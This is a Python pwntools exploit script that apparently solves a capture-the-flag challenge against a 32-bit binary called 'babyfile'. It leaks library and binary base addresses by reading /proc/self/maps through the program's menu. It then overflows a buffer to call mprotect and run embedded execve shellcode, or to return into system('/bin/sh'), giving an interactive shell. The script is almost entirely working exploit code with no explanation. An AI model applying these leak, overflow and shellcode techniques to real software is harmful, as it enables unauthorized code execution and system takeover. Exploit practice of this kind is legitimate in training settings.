#!/usr/bin/python

from pwn import *
from LibcSearcher import *

def choose(choice):
    global s
    s.recvuntil('Your choice : ')
    s.send(str(choice))

def open_file(filename):
    global s
    choose(1)
    s.recvuntil('File name : ')
    s.send(filename)

def read_file(size):
    global s
    choose(2)
    s.recvuntil('Size : ')
    s.send(str(size))

def write_content():
    global s
    choose(3)
    s.recvuntil('CONTENT : ')

def leak():
    global s
    baselibc = 0
    basebin  = 0

    open_file('/proc/self/maps')
    read_file(100000)
    write_content()
    while(True):
        line = s.recvline(timeout=1)
        if 'libc' in line and 'r-xp' in line:
            baselibc = int(line[:8], 16)
        elif 'babyfile' in line and 'r-xp' in line:
            basebin = int(line[:8], 16)
        elif 'babyfile' in line and 'rw-p' in line:
            bss = int(line[:8], 16)
        if baselibc != 0 and basebin != 0:
            break
    return bss, basebin, baselibc

def call_shellcode():
    global pad, s, mprotect, bss
    sc32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    payload = pad + 'b'*4
    payload += p32(mprotect)
    payload += p32(bss+0x500+0x200) #ret_addr
    payload += p32(bss)
    payload += p32(0x1000)
    payload += p32(0x7)
    payload += 'c'*(0x200+0xa-len(payload))
    payload += sc32
    s.send(payload)

def call_system():
    global pad, s, system, binsh
    payload = pad + 'b'*4
    payload += p32(system)
    payload += 'c'*4
    payload += p32(binsh)
    s.send(payload)

#context.log_level = 'debug'
s = process('./babyfile')

raw_input('[Stop]')
bss, basebin, baselibc = leak()
log.success("base binary's address: " + hex(basebin))
log.success("base libc's address: " + hex(baselibc))

elf = ELF('/lib/i386-linux-gnu/libc.so.6')
mprotect = baselibc + elf.symbols['mprotect']
system   = baselibc + elf.symbols['system']
binsh    = baselibc + next(elf.search('/bin/sh'))
log.success("mprotect's address: " + hex(mprotect))
available_read = basebin + 0xc79

choose(0x1000) #make the size parameter for the read function's call

pad = 'a'*0xa
payload = pad
payload += p32(bss+0x500) 
payload += p32(available_read)
choose(payload)

print '1. Call Shellcode'
print '2. Call System("/bin/sh") [Default]'
try:
    choice = int(raw_input('Your choice: '), 10)
    if choice == 1:
        call_shellcode()
    else:
        call_system()
except:
    print 'Calling System("/bin/sh")...'
    call_system()

s.interactive()
